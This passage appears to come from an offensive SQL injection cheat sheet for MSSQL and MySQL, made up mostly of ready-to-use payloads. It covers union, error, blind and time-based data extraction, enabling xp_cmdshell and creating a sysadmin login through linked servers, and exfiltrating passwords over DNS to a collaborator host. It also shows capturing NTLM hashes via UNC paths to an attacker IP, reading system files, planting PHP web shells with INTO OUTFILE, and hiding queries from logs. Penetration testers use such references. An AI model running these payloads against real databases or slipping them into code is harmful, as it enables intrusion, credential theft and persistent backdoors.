SELECT name FROM someotherdb..sysobjects WHERE xtype = 'U';

-- list column names and types for master..sometable
SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name='sometable';

SELECT table_catalog, table_name FROM information_schema.columns
SELECT table_name FROM information_schema.tables WHERE table_catalog='<DBNAME>'

-- Change delimiter value such as ', ' to anything else you want => trace_xe_action_map, trace_xe_event_map, spt_fallback_db, spt_fallback_dev, spt_fallback_usg, spt_monitor, MSreplication_options  (Only works in MSSQL 2017+)
SELECT STRING_AGG(name, ', ') FROM master..sysobjects WHERE xtype = 'U';
```

### MSSQL List Columns

```sql
-- for the current DB only
SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'mytable');

-- list column names and types for master..sometable
SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name='sometable'; 

SELECT table_catalog, column_name FROM information_schema.columns

SELECT COL_NAME(OBJECT_ID('<DBNAME>.<TABLE_NAME>'), <INDEX>)
```

## MSSQL Union Based

* Extract databases names

    ```sql
    $ SELECT name FROM master..sysdatabases
    [*] Injection
    [*] msdb
    [*] tempdb
    ```

* Extract tables from Injection database

    ```sql
    $ SELECT name FROM Injection..sysobjects WHERE xtype = 'U'
    [*] Profiles
    [*] Roles
    [*] Users
    ```

* Extract columns for the table Users

    ```sql
    $ SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'Users')
    [*] UserId
    [*] UserName
    ```

* Finally extract the data

    ```sql
    SELECT  UserId, UserName from Users
    ```

## MSSQL Error Based

| Name         | Payload         |
| ------------ | --------------- |
| CONVERT      | `AND 1337=CONVERT(INT,(SELECT '~'+(SELECT @@version)+'~')) -- -` |
| IN           | `AND 1337 IN (SELECT ('~'+(SELECT @@version)+'~')) -- -` |
| EQUAL        | `AND 1337=CONCAT('~',(SELECT @@version),'~') -- -` |
| CAST         | `CAST((SELECT @@version) AS INT)` |

* For integer inputs

    ```sql
    convert(int,@@version)
    cast((SELECT @@version) as int)
    ```

* For string inputs

    ```sql
    ' + convert(int,@@version) + '
    ' + cast((SELECT @@version) as int) + '
    ```

## MSSQL Blind Based

```sql
AND LEN(SELECT TOP 1 username FROM tblusers)=5 ; -- -
```

```sql
SELECT @@version WHERE @@version LIKE '%12.0.2000.8%'
WITH data AS (SELECT (ROW_NUMBER() OVER (ORDER BY message)) as row,* FROM log_table)
SELECT message FROM data WHERE row = 1 and message like 't%'
```

### MSSQL Blind With Substring Equivalent

| Function    | Example                                         |
| ----------- | ----------------------------------------------- |
| `SUBSTRING` | `SUBSTRING('foobar', <START>, <LENGTH>)`        |

Examples:

```sql
AND ASCII(SUBSTRING(SELECT TOP 1 username FROM tblusers),1,1)=97
AND UNICODE(SUBSTRING((SELECT 'A'),1,1))>64-- 
AND SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables > 'A'
AND ISNULL(ASCII(SUBSTRING(CAST((SELECT LOWER(db_name(0)))AS varchar(8000)),1,1)),0)>90
```

## MSSQL Time Based

In a time-based blind SQL injection attack, an attacker injects a payload that uses `WAITFOR DELAY` to make the database pause for a certain period. The attacker then observes the response time to infer whether the injected payload executed successfully or not.

```sql
ProductID=1;waitfor delay '0:0:10'--
ProductID=1);waitfor delay '0:0:10'--
ProductID=1';waitfor delay '0:0:10'--
ProductID=1');waitfor delay '0:0:10'--
ProductID=1));waitfor delay '0:0:10'--
```

```sql
IF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]'
IF 1=1 WAITFOR DELAY '0:0:5' ELSE WAITFOR DELAY '0:0:0';
```

## MSSQL Stacked Query

* Stacked query without any statement terminator

    ```sql
    -- multiple SELECT statements
    SELECT 'A'SELECT 'B'SELECT 'C'

    -- updating password with a stacked query
    SELECT id, username, password FROM users WHERE username = 'admin'exec('update[users]set[password]=''a''')--

    -- using the stacked query to enable xp_cmdshell
    -- you won't have the output of the query, redirect it to a file 
    SELECT id, username, password FROM users WHERE username = 'admin'exec('sp_configure''show advanced option'',''1''reconfigure')exec('sp_configure''xp_cmdshell'',''1''reconfigure')--
    ```

* Use a semi-colon "`;`" to add another query

    ```sql
    ProductID=1; DROP members--
    ```

## MSSQL File Manipulation

### MSSQL Read File

**Permissions**: The `BULK` option requires the `ADMINISTER BULK OPERATIONS` or the `ADMINISTER DATABASE BULK OPERATIONS` permission.

```sql
OPENROWSET(BULK 'C:\path\to\file', SINGLE_CLOB)
```

Example:

```sql
-1 union select null,(select x from OpenRowset(BULK 'C:\Windows\win.ini',SINGLE_CLOB) R(x)),null,null
```

### MSSQL Write File

```sql
execute spWriteStringToFile 'contents', 'C:\path\to\', 'file'
```

## MSSQL Command Execution

### XP_CMDSHELL

`xp_cmdshell` is a system stored procedure in Microsoft SQL Server that allows you to run operating system commands directly from within T-SQL (Transact-SQL).

```sql
EXEC xp_cmdshell "net user";
EXEC master.dbo.xp_cmdshell 'cmd.exe dir c:';
EXEC master.dbo.xp_cmdshell 'ping 127.0.0.1';
```

If you need to reactivate `xp_cmdshell`, it is disabled by default in SQL Server 2005.

```sql
-- Enable advanced options
EXEC sp_configure 'show advanced options',1;
RECONFIGURE;

-- Enable xp_cmdshell
EXEC sp_configure 'xp_cmdshell',1;
RECONFIGURE;
```

### Python Script

> Executed by a different user than the one using `xp_cmdshell` to execute commands

```powershell
EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__("getpass").getuser())'
EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__("os").system("whoami"))'
EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(open("C:\\inetpub\\wwwroot\\web.config", "r").read())'
```

## MSSQL Out of Band

### MSSQL DNS exfiltration

Technique from [@ptswarm](https://twitter.com/ptswarm/status/1313476695295512578/photo/1)

* **Permission**: Requires `VIEW SERVER STATE` permission on the server.

    ```powershell
    1 and exists(select * from fn_xe_file_target_read_file('C:\*.xel','\\'%2b(select pass from users where id=1)%2b'.xxxx.burpcollaborator.net\1.xem',null,null))
    ```

* **Permission**: Requires the `CONTROL SERVER` permission.

    ```powershell
    1 (select 1 where exists(select * from fn_get_audit_file('\\'%2b(select pass from users where id=1)%2b'.xxxx.burpcollaborator.net\',default,default)))
    1 and exists(select * from fn_trace_gettable('\\'%2b(select pass from users where id=1)%2b'.xxxx.burpcollaborator.net\1.trc',default))
    ```

### MSSQL UNC Path

MSSQL supports stacked queries so we can create a variable pointing to our IP address then use the `xp_dirtree` function to list the files in our SMB share and grab the NTLMv2 hash.

```sql
1'; use master; exec xp_dirtree '\\10.10.15.XX\SHARE';-- 
```

```sql
xp_dirtree '\\attackerip\file'
xp_fileexist '\\attackerip\file'
BACKUP LOG [TESTING] TO DISK = '\\attackerip\file'
BACKUP DATABASE [TESTING] TO DISK = '\\attackeri\file'
RESTORE LOG [TESTING] FROM DISK = '\\attackerip\file'
RESTORE DATABASE [TESTING] FROM DISK = '\\attackerip\file'
RESTORE HEADERONLY FROM DISK = '\\attackerip\file'
RESTORE FILELISTONLY FROM DISK = '\\attackerip\file'
RESTORE LABELONLY FROM DISK = '\\attackerip\file'
RESTORE REWINDONLY FROM DISK = '\\attackerip\file'
RESTORE VERIFYONLY FROM DISK = '\\attackerip\file'
```

## MSSQL Trusted Links

A trusted link in Microsoft SQL Server is a linked server relationship that allows one SQL Server instance to execute queries and even remote procedures on another server (or external OLE DB source) as if the remote server were part of the local environment. Linked servers expose options that control whether remote procedures and RPC calls are allowed and what security context is used on the remote server.

> The links between databases work even across forest trusts.

* Find links using `sysservers`: contains one row for each server that an instance of SQL Server can access as an OLE DB data source.

    ```sql
    select * from master..sysservers
    ```

* Execute query through the link

    ```sql
    select * from openquery("dcorp-sql1", 'select * from master..sysservers')
    select version from openquery("linkedserver", 'select @@version as version')

    -- Chain multiple openquery
    select version from openquery("link1",'select version from openquery("link2","select @@version as version")')
    ```

* Execute shell commands

    ```sql
    -- Enable xp_cmdshell and execute "dir" command
    EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT LinkedServer
    select 1 from openquery("linkedserver",'select 1;exec master..xp_cmdshell "dir c:"')

    -- Create a SQL user and give sysadmin privileges
    EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT "DOMAIN\SERVER1"') AT "DOMAIN\SERVER2"
    EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT "DOMAIN\SERVER1"') AT "DOMAIN\SERVER2"
    ```

## MSSQL Privileges

### MSSQL List Permissions

* Listing effective permissions of current user on the server.

    ```sql
    SELECT * FROM fn_my_permissions(NULL, 'SERVER'); 
    ```

* Listing effective permissions of current user on the database.

    ```sql
    SELECT * FROM fn_my_permissions (NULL, 'DATABASE');
    ```

* Listing effective permissions of current user on a view.

    ```sql
    SELECT * FROM fn_my_permissions('Sales.vIndividualCustomer', 'OBJECT') ORDER BY subentity_name, permission_name; 
    ```

* Check if current user is a member of the specified server role.

    ```sql
    -- possible roles: sysadmin, serveradmin, dbcreator, setupadmin, bulkadmin, securityadmin, diskadmin, public, processadmin
    SELECT is_srvrolemember('sysadmin');
    ```

### MSSQL Make User DBA

```sql
EXEC master.dbo.sp_addsrvrolemember 'user', 'sysadmin;
```

## MSSQL Database Credentials

* **MSSQL 2000**: Hashcat mode 131: `0x01002702560500000000000000000000000000000000000000008db43dd9b1972a636ad0c7d4b8c515cb8ce46578`

    ```sql
    SELECT name, password FROM master..sysxlogins
    SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins 
    -- Need to convert to hex to return hashes in MSSQL error message / some version of query analyzer
    ```

* **MSSQL 2005**: Hashcat mode 132: `0x010018102152f8f28c8499d8ef263c53f8be369d799f931b2fbe`

    ```sql
    SELECT name, password_hash FROM master.sys.sql_logins
    SELECT name + '-' + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins
    ```

## MSSQL OPSEC

Use `SP_PASSWORD` in a query to hide from the logs like : `' AND 1=1--sp_password`

```sql
-- 'sp_password' was found in the text of this event.
-- The text has been replaced with this comment for security reasons.
```


---

# MySQL Injection

> MySQL Injection  is a type of security vulnerability that occurs when an attacker is able to manipulate the SQL queries made to a MySQL database by injecting malicious input. This vulnerability is often the result of improperly handling user input, allowing attackers to execute arbitrary SQL code that can compromise the database's integrity and security.

## MYSQL Default Databases

| Name               | Description              |
|--------------------|--------------------------|
| mysql              | Requires root privileges |
| information_schema | Available from version 5 and higher |

## MYSQL Comments

MySQL comments are annotations in SQL code that are ignored by the MySQL server during execution.

| Type                       | Description                       |
|----------------------------|-----------------------------------|
| `#`                        | Hash comment                      |
| `/* MYSQL Comment */`      | C-style comment                   |
| `/*! MYSQL Special SQL */` | Special SQL                       |
| `/*!32302 10*/`            | Comment for MYSQL version 3.23.02 |
| `--`                       | SQL comment                       |
| `;%00`                     | Nullbyte                          |
| \`                         | Backtick                          |

## MYSQL Testing Injection

* **Strings**: Query like `SELECT * FROM Table WHERE id = 'FUZZ';`

    ```ps1
    ' False
    '' True
    " False
    "" True
    \ False
    \\ True
    ```

* **Numeric**: Query like `SELECT * FROM Table WHERE id = FUZZ;`

    ```ps1
    AND 1     True
    AND 0     False
    AND true True
    AND false False
    1-false     Returns 1 if vulnerable
    1-true     Returns 0 if vulnerable
    1*56     Returns 56 if vulnerable
    1*56     Returns 1 if not vulnerable
    ```

* **Login**: Query like `SELECT * FROM Users WHERE username = 'FUZZ1' AND password = 'FUZZ2';`

    ```ps1
    ' OR '1
    ' OR 1 -- -
    " OR "" = "
    " OR 1 = 1 -- -
    '='
    'LIKE'
    '=0--+
    ```

## MYSQL Union Based

### Detect Columns Number

To successfully perform a union-based SQL injection, an attacker needs to know the number of columns in the original query.

#### Iterative NULL Method

Systematically increase the number of columns in the `UNION SELECT` statement until the payload executes without errors or produces a visible change. Each iteration checks the compatibility of the column count.

```sql
UNION SELECT NULL;--
UNION SELECT NULL, NULL;-- 
UNION SELECT NULL, NULL, NULL;-- 
```

#### ORDER BY Method

Keep incrementing the number until you get a `False` response. Even though `GROUP BY` and `ORDER BY` have different functionality in SQL, they both can be used in the exact same fashion to determine the number of columns in the query.

| ORDER BY        | GROUP BY        | Result |
| --------------- | --------------- | ------ |
| `ORDER BY 1--+` | `GROUP BY 1--+` | True   |
| `ORDER BY 2--+` | `GROUP BY 2--+` | True   |
| `ORDER BY 3--+` | `GROUP BY 3--+` | True   |
| `ORDER BY 4--+` | `GROUP BY 4--+` | False  |

Since the result is false for `ORDER BY 4`, it means the SQL query is only having 3 columns.
In the `UNION` based SQL injection, you can `SELECT` arbitrary data to display on the page: `-1' UNION SELECT 1,2,3--+`.

Similar to the previous method, we can check the number of columns with one request if error showing is enabled.

```sql
ORDER BY 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100--+ # Unknown column '4' in 'order clause'
```

#### LIMIT INTO Method

This method is effective when error reporting is enabled. It can help determine the number of columns in cases where the injection point occurs after a LIMIT clause.

| Payload                      | Error           |
| ---------------------------- | --------------- |
| `1' LIMIT 1,1 INTO @--+`     | `The used SELECT statements have a different number of columns` |
| `1' LIMIT 1,1 INTO @,@--+`  | `The used SELECT statements have a different number of columns` |
| `1' LIMIT 1,1 INTO @,@,@--+` | `No error means query uses 3 columns` |

Since the result doesn't show any error it means the query uses 3 columns: `-1' UNION SELECT 1,2,3--+`.

### Extract Database With Information_Schema

This query retrieves the names of all schemas (databases) on the server.

```sql
UNION SELECT 1,2,3,4,...,GROUP_CONCAT(0x7c,schema_name,0x7c) FROM information_schema.schemata
```

This query retrieves the names of all tables within a specified schema (the schema name is represented by PLACEHOLDER).

```sql
UNION SELECT 1,2,3,4,...,GROUP_CONCAT(0x7c,table_name,0x7C) FROM information_schema.tables WHERE table_schema=PLACEHOLDER
```

This query retrieves the names of all columns in a specified table.

```sql
UNION SELECT 1,2,3,4,...,GROUP_CONCAT(0x7c,column_name,0x7C) FROM information_schema.columns WHERE table_name=...
```

This query aims to retrieve data from a specific table.

```sql
UNION SELECT 1,2,3,4,...,GROUP_CONCAT(0x7c,data,0x7C) FROM ...
```

### Extract Columns Name Without Information_Schema

Method for `MySQL >= 4.1`.

| Payload | Output |
| --- | --- |
| `(1)and(SELECT * from db.users)=(1)` | Operand should contain **4** column(s) |
| `1 and (1,2,3,4) = (SELECT * from db.users UNION SELECT 1,2,3,4 LIMIT 1)` | Column '**id**' cannot be null |

Method for `MySQL 5`

| Payload | Output |
| --- | --- |
| `UNION SELECT * FROM (SELECT * FROM users JOIN users b)a` | Duplicate column name '**id**' |
| `UNION SELECT * FROM (SELECT * FROM users JOIN users b USING(id))a` | Duplicate column name '**name**' |
| `UNION SELECT * FROM (SELECT * FROM users JOIN users b USING(id,name))a` | Data |

### Extract Data Without Columns Name

Extracting data from the 4th column without knowing its name.

```sql
SELECT `4` FROM (SELECT 1,2,3,4,5,6 UNION SELECT * FROM USERS)DBNAME;
```

Injection example inside the query `select author_id,title from posts where author_id=[INJECT_HERE]`

```sql
MariaDB [dummydb]> SELECT AUTHOR_ID,TITLE FROM POSTS WHERE AUTHOR_ID=-1 UNION SELECT 1,(SELECT CONCAT(`3`,0X3A,`4`) FROM (SELECT 1,2,3,4,5,6 UNION SELECT * FROM USERS)A LIMIT 1,1);
+-----------+-----------------------------------------------------------------+
| author_id | title                                                           |
+-----------+-----------------------------------------------------------------+
|         1 | a45d4e080fc185dfa223aea3d0c371b6cc180a37:veronica80@example.org |
+-----------+-----------------------------------------------------------------+
```

## MYSQL Error Based

| Name         | Payload         |
| ------------ | --------------- |
| GTID_SUBSET  | `AND GTID_SUBSET(CONCAT('~',(SELECT version()),'~'),1337) -- -` |
| JSON_KEYS    | `AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT('~',(SELECT version()),'~')) USING utf8))) -- -` |
| EXTRACTVALUE | `AND EXTRACTVALUE(1337,CONCAT('.','~',(SELECT version()),'~')) -- -` |
| UPDATEXML    | `AND UPDATEXML(1337,CONCAT('.','~',(SELECT version()),'~'),31337) -- -` |
| EXP          | `AND EXP(~(SELECT * FROM (SELECT CONCAT('~',(SELECT version()),'~','x'))x)) -- -` |
| OR           | `OR 1 GROUP BY CONCAT('~',(SELECT version()),'~',FLOOR(RAND(0)*2)) HAVING MIN(0) -- -` |
| NAME_CONST   | `AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)--` |
| UUID_TO_BIN  | `AND UUID_TO_BIN(version())='1` |

### MYSQL Error Based - Basic

Works with `MySQL >= 4.1`

```sql
(SELECT 1 AND ROW(1,1)>(SELECT COUNT(*),CONCAT(CONCAT(@@VERSION),0X3A,FLOOR(RAND()*2))X FROM (SELECT 1 UNION SELECT 2)A GROUP BY X LIMIT 1))
'+(SELECT 1 AND ROW(1,1)>(SELECT COUNT(*),CONCAT(CONCAT(@@VERSION),0X3A,FLOOR(RAND()*2))X FROM (SELECT 1 UNION SELECT 2)A GROUP BY X LIMIT 1))+'
```

### MYSQL Error Based - UpdateXML Function

```sql
AND UPDATEXML(rand(),CONCAT(CHAR(126),version(),CHAR(126)),null)-
AND UPDATEXML(rand(),CONCAT(0x3a,(SELECT CONCAT(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT data_offset,1)),null)--
AND UPDATEXML(rand(),CONCAT(0x3a,(SELECT CONCAT(CHAR(126),TABLE_NAME,CHAR(126)) FROM information_schema.TABLES WHERE table_schema=data_column LIMIT data_offset,1)),null)--
AND UPDATEXML(rand(),CONCAT(0x3a,(SELECT CONCAT(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME=data_table LIMIT data_offset,1)),null)--
AND UPDATEXML(rand(),CONCAT(0x3a,(SELECT CONCAT(CHAR(126),data_info,CHAR(126)) FROM data_table.data_column LIMIT data_offset,1)),null)--
```

Shorter to read:

```sql
UPDATEXML(null,CONCAT(0x0a,version()),null)-- -
UPDATEXML(null,CONCAT(0x0a,(select table_name from information_schema.tables where table_schema=database() LIMIT 0,1)),null)-- -
```

### MYSQL Error Based - Extractvalue Function

Works with `MySQL >= 5.1`

```sql
?id=1 AND EXTRACTVALUE(RAND(),CONCAT(CHAR(126),VERSION(),CHAR(126)))--
?id=1 AND EXTRACTVALUE(RAND(),CONCAT(0X3A,(SELECT CONCAT(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT data_offset,1)))--
?id=1 AND EXTRACTVALUE(RAND(),CONCAT(0X3A,(SELECT CONCAT(CHAR(126),table_name,CHAR(126)) FROM information_schema.TABLES WHERE table_schema=data_column LIMIT data_offset,1)))--
?id=1 AND EXTRACTVALUE(RAND(),CONCAT(0X3A,(SELECT CONCAT(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME=data_table LIMIT data_offset,1)))--
?id=1 AND EXTRACTVALUE(RAND(),CONCAT(0X3A,(SELECT CONCAT(CHAR(126),data_column,CHAR(126)) FROM data_schema.data_table LIMIT data_offset,1)))--
```

### MYSQL Error Based - NAME_CONST function (only for constants)

Works with `MySQL >= 5.0`

```sql
?id=1 AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)--
?id=1 AND (SELECT * FROM (SELECT NAME_CONST(user(),1),NAME_CONST(user(),1)) as x)--
?id=1 AND (SELECT * FROM (SELECT NAME_CONST(database(),1),NAME_CONST(database(),1)) as x)--
```

## MYSQL Blind

### MYSQL Blind With Substring Equivalent

| Function | Example | Description |
| --- | --- | --- |
| `SUBSTR` | `SUBSTR(version(),1,1)=5` | Extracts a substring from a string (starting at any position) |
| `SUBSTRING` | `SUBSTRING(version(),1,1)=5` | Extracts a substring from a string (starting at any position) |
| `RIGHT` | `RIGHT(left(version(),1),1)=5` | Extracts a number of characters from a string (starting from right) |
| `MID` | `MID(version(),1,1)=4` | Extracts a substring from a string (starting at any position) |
| `LEFT` | `LEFT(version(),1)=4` | Extracts a number of characters from a string (starting from left) |

Examples of Blind SQL injection using `SUBSTRING` or another equivalent function:

```sql
?id=1 AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables > 'A'
?id=1 AND SELECT SUBSTR(column_name,1,1) FROM information_schema.columns > 'A'
?id=1 AND ASCII(LOWER(SUBSTR(version(),1,1)))=51
```

### MYSQL Blind Using a Conditional Statement

* TRUE: `if @@version starts with a 5`:

    ```sql
    2100935' OR IF(MID(@@version,1,1)='5',sleep(1),1)='2
    Response:
    HTTP/1.1 500 Internal Server Error
    ```

* FALSE: `if @@version starts with a 4`:

    ```sql
    2100935' OR IF(MID(@@version,1,1)='4',sleep(1),1)='2
    Response:
    HTTP/1.1 200 OK
    ```

### MYSQL Blind With MAKE_SET

```sql
AND MAKE_SET(VALUE_TO_EXTRACT<(SELECT(length(version()))),1)
AND MAKE_SET(VALUE_TO_EXTRACT<ascii(substring(version(),POS,1)),1)
AND MAKE_SET(VALUE_TO_EXTRACT<(SELECT(length(concat(login,password)))),1)
AND MAKE_SET(VALUE_TO_EXTRACT<ascii(substring(concat(login,password),POS,1)),1)
```

### MYSQL Blind With LIKE

In MySQL, the `LIKE` operator can be used to perform pattern matching in queries. The operator allows the use of wildcard characters to match unknown or partial string values. This is especially useful in a blind SQL injection context when an attacker does not know the length or specific content of the data stored in the database.

Wildcard Characters in LIKE:

* **Percentage Sign** (`%`): This wildcard represents zero, one, or multiple characters. It can be used to match any sequence of characters.
* **Underscore** (`_`): This wildcard represents a single character. It's used for more precise matching when you know the structure of the data but not the specific character at a particular position.

```sql
SELECT cust_code FROM customer WHERE cust_name LIKE 'k__l';
SELECT * FROM products WHERE product_name LIKE '%user_input%'
```

### MySQL Blind with REGEXP

Blind SQL injection can also be performed using the MySQL `REGEXP` operator, which is used for matching a string against a regular expression. This technique is particularly useful when attackers want to perform more complex pattern matching than what the `LIKE` operator can offer.

| Payload | Description |
| --- | --- |
| `' OR (SELECT username FROM users WHERE username REGEXP '^.{8,}$') --` | Checking length |
| `' OR (SELECT username FROM users WHERE username REGEXP '[0-9]') --`   | Checking for the presence of digits |
| `' OR (SELECT username FROM users WHERE username REGEXP '^a[a-z]') --` | Checking for data starting by "a" |

## MYSQL Time Based

The following SQL codes will delay the output from MySQL.

* MySQL 4/5 : [`BENCHMARK()`](https://dev.mysql.com/doc/refman/8.4/en/select-benchmarking.html)

    ```sql
    +BENCHMARK(40000000,SHA1(1337))+
    '+BENCHMARK(3200,SHA1(1))+'
    AND [RANDNUM]=BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))
    ```

* MySQL 5: [`SLEEP()`](https://dev.mysql.com/doc/refman/8.4/en/miscellaneous-functions.html#function_sleep)

    ```sql
    RLIKE SLEEP([SLEEPTIME])
    OR ELT([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME]))
    XOR(IF(NOW()=SYSDATE(),SLEEP(5),0))XOR
    AND SLEEP(10)=0
    AND (SELECT 1337 FROM (SELECT(SLEEP(10-(IF((1=1),0,10))))) RANDSTR)
    ```

### Using SLEEP in a Subselect

Extracting the length of the data.

```sql
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE '%')#
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE '___')# 
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE '____')#
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE '_____')#
```

Extracting the first character.

```sql
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'A____')#
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'S____')#
```

Extracting the second character.

```sql
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'SA___')#
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'SW___')#
```

Extracting the third character.

```sql
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'SWA__')#
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'SWB__')#
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'SWI__')#
```

Extracting column_name.

```sql
1 AND (SELECT SLEEP(10) FROM DUAL WHERE (SELECT table_name FROM information_schema.columns WHERE table_schema=DATABASE() AND column_name LIKE '%pass%' LIMIT 0,1) LIKE '%')#
```

### Using Conditional Statements

```sql
?id=1 AND IF(ASCII(SUBSTRING((SELECT USER()),1,1))>=100,1, BENCHMARK(2000000,MD5(NOW()))) --
?id=1 AND IF(ASCII(SUBSTRING((SELECT USER()), 1, 1))>=100, 1, SLEEP(3)) --
?id=1 OR IF(MID(@@version,1,1)='5',sleep(1),1)='2
```

## MYSQL DIOS - Dump in One Shot

DIOS (Dump In One Shot) SQL Injection is an advanced technique that allows an attacker to extract entire database contents in a single, well-crafted SQL injection payload. This method leverages the ability to concatenate multiple pieces of data into a single result set, which is then returned in one response from the database.

```sql
(select (@) from (select(@:=0x00),(select (@) from (information_schema.columns) where (table_schema>=@) and (@)in (@:=concat(@,0x0D,0x0A,' [ ',table_schema,' ] > ',table_name,' > ',column_name,0x7C))))a)#
(select (@) from (select(@:=0x00),(select (@) from (db_data.table_data) where (@)in (@:=concat(@,0x0D,0x0A,0x7C,' [ ',column_data1,' ] > ',column_data2,' > ',0x7C))))a)#
```

* SecurityIdiots

    ```sql
    make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)
    ```

* Profexer

    ```sql
    (select(@)from(select(@:=0x00),(select(@)from(information_schema.columns)where(@)in(@:=concat(@,0x3C62723E,table_name,0x3a,column_name))))a)
    ```

* Dr.Z3r0

    ```sql
    (select(select concat(@:=0xa7,(select count(*)from(information_schema.columns)where(@:=concat(@,0x3c6c693e,table_name,0x3a,column_name))),@))
    ```

* M@dBl00d

    ```sql
    (Select export_set(5,@:=0,(select count(*)from(information_schema.columns)where@:=export_set(5,export_set(5,@,table_name,0x3c6c693e,2),column_name,0xa3a,2)),@,2))
    ```

* Zen

    ```sql
    +make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)
    ```

* sharik

    ```sql
    (select(@a)from(select(@a:=0x00),(select(@a)from(information_schema.columns)where(table_schema!=0x696e666f726d6174696f6e5f736368656d61)and(@a)in(@a:=concat(@a,table_name,0x203a3a20,column_name,0x3c62723e))))a)
    ```

## MYSQL Current Queries

`INFORMATION_SCHEMA.PROCESSLIST` is a special table available in MySQL and MariaDB that provides information about active processes and threads within the database server. This table can list all operations that DB is performing at the moment.

The `PROCESSLIST` table contains several important columns, each providing details about the current processes. Common columns include:

* **ID** : The process identifier.
* **USER** : The MySQL user who is running the process.
* **HOST** : The host from which the process was initiated.
* **DB** : The database the process is currently accessing, if any.
* **COMMAND** : The type of command the process is executing (e.g., Query, Sleep).
* **TIME** : The time in seconds that the process has been running.
* **STATE** : The current state of the process.
* **INFO** : The text of the statement being executed, or NULL if no statement is being executed.

```sql
SELECT * FROM INFORMATION_SCHEMA.PROCESSLIST;
```

| ID  | USER      | HOST           | DB     | COMMAND | TIME | STATE      | INFO |
| --- | --------- | ---------------- | ------- | ------- | ---- | ---------- | ---- |
| 1   | root   | localhost        | testdb  | Query  | 10 | executing  | SELECT * FROM some_table |
| 2   | app_uset  | 192.168.0.101    | appdb   | Sleep  | 300 | sleeping  | NULL |
| 3   | gues_user | example.com:3360 | NULL    | Connect | 0    | connecting | NULL |

```sql
UNION SELECT 1,state,info,4 FROM INFORMATION_SCHEMA.PROCESSLIST #
```

Dump in one shot query to extract the whole content of the table.

```sql
UNION SELECT 1,(SELECT(@)FROM(SELECT(@:=0X00),(SELECT(@)FROM(information_schema.processlist)WHERE(@)IN(@:=CONCAT(@,0x3C62723E,state,0x3a,info))))a),3,4 #
```

## MYSQL Read Content of a File

Need the `filepriv`, otherwise you will get the error : `ERROR 1290 (HY000): The MySQL server is running with the --secure-file-priv option so it cannot execute this statement`

```sql
UNION ALL SELECT LOAD_FILE('/etc/passwd') --
UNION ALL SELECT TO_base64(LOAD_FILE('/var/www/html/index.php'));
```

If you are `root` on the database, you can re-enable the `LOAD_FILE` using the following query

```sql
GRANT FILE ON *.* TO 'root'@'localhost'; FLUSH PRIVILEGES;#
```

## MYSQL Command Execution

### WEBSHELL - OUTFILE Method

```sql
[...] UNION SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:\\xampp\\htdocs\\backdoor.php"
[...] UNION SELECT '' INTO OUTFILE '/var/www/html/x.php' FIELDS TERMINATED BY '<?php phpinfo();?>'
[...] UNION SELECT 1,2,3,4,5,0x3c3f70687020706870696e666f28293b203f3e into outfile 'C:\\wamp\\www\\pwnd.php'-- -
[...] union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/inetpub/wwwroot/backdoor.php'
```

### WEBSHELL - DUMPFILE Method

```sql
[...] UNION SELECT 0xPHP_PAYLOAD_IN_HEX, NULL, NULL INTO DUMPFILE 'C:/Program Files/EasyPHP-12.1/www/shell.php'
